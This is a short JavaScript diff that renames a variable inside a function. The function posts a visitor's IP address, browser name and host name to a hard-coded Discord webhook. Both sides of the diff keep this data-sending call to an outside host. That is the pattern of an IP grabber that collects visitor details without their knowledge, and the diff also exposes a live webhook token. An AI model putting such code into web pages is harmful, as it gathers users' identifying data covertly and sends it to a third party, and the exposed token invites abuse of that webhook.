@@ -3,13 +3,13 @@
 
 
 function sendDataToWebhook(ipAddress, browserName, hostName) {
-  const Webhookurl = 'https://discord.com/api/webhooks/1200798509234933770/rZl03dTu_SO0IozUnSd1POxZx7pE-zoIqfA-5sklYcR8ptISHA5ADIpjFs5F5zk_wPiN';
+  const webhookURL = 'https://discord.com/api/webhooks/1200798509234933770/rZl03dTu_SO0IozUnSd1POxZx7pE-zoIqfA-5sklYcR8ptISHA5ADIpjFs5F5zk_wPiN';
 
   const data = {
     content: `IP Address: ${ipAddress}\nBrowser Name: ${browserName}\nHost Name: ${hostName}`
   };
 
-  fetch(Webhookurl, {
+  fetch(webhookURL, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
